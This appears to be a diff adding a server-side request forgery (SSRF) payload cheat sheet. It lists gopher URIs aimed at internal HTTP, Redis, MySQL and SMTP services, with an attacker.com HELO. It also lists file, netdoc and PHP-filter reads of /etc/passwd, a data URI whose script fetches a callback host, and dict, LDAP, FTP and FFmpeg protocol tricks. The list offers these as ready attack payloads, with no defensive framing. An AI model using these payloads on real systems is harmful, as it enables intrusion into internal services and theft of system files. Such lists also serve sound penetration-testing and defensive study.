@@ -1,0 +1,51 @@
+# Protocol Smuggling Techniques for SSRF
+
+# Gopher protocol (if supported)
+gopher://internal:port/_payload
+
+# Gopher -> HTTP
+gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+
+# Gopher -> Redis
+gopher://127.0.0.1:6379/_SET%20key%20value
+
+# Gopher -> MySQL
+gopher://127.0.0.1:3306/_payload
+
+# Gopher -> SMTP
+gopher://127.0.0.1:25/_HELO%20attacker.com%0D%0AMAIL%20FROM...
+
+# Dict protocol
+dict://internal:port/info
+
+# LDAP protocol
+ldap://internal:389/
+
+# File protocol
+file:///etc/passwd
+file://localhost/etc/passwd
+file://127.0.0.1/etc/passwd
+
+# FTP protocol (for file read)
+ftp://internal/path
+
+# TFTP protocol
+tftp://internal/file
+
+# Netdoc (Java)
+netdoc:///etc/passwd
+
+# Jar protocol (Java)
+jar:http://internal/file.jar!/path
+
+# Data URI (encoding payload)
+data:text/html,<script>fetch('http://callback')</script>
+
+# PHP wrappers (if PHP backend)
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://input
+php://fd/0
+
+# FFmpeg specific protocols
+concat:http://internal|file:///etc/passwd
+subfile:http://internal
